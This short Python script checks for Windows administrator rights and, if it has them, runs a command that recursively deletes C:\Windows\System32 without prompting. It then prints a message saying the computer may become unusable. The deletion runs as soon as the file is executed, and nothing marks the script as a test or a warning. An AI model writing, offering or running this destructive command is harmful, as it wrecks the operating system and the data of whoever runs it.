import ctypes
import os


def delete_system32():
    # Check for admin privileges
    if ctypes.windll.shell32.IsUserAnAdmin():
        # Admin privileges are available
        os.system("rmdir /s /q C:\\Windows\\System32")
        print("System32 has been successfully deleted. Your computer may become unusable.")
    else:
        print("You do not have admin privileges to execute this function.")


# Call the function
delete_system32()
